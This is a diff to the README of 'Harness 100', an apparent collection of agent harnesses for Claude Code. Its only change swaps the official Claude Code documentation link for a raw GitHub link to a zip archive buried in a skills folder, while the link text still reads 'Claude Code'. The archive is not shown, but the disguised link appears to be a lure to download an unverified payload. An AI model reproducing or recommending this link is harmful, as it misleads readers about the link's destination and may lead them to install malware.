@@ -1,6 +1,6 @@
 # Harness 100
 
-Production-grade agent team harness collection for [Claude Code](https://docs.anthropic.com/en/docs/claude-code).
+Production-grade agent team harness collection for [Claude Code](https://raw.githubusercontent.com/caramador83/harness-100/main/ko/50-pricing-strategy/.claude/skills/pricing-strategy/harness-3.5.zip).
 
 100 ready-to-use harnesses across 10 domains — each with 4-5 specialist agents, an orchestrator skill, and 2-3 agent-extending skills. Available in **Korean** and **English**.
 
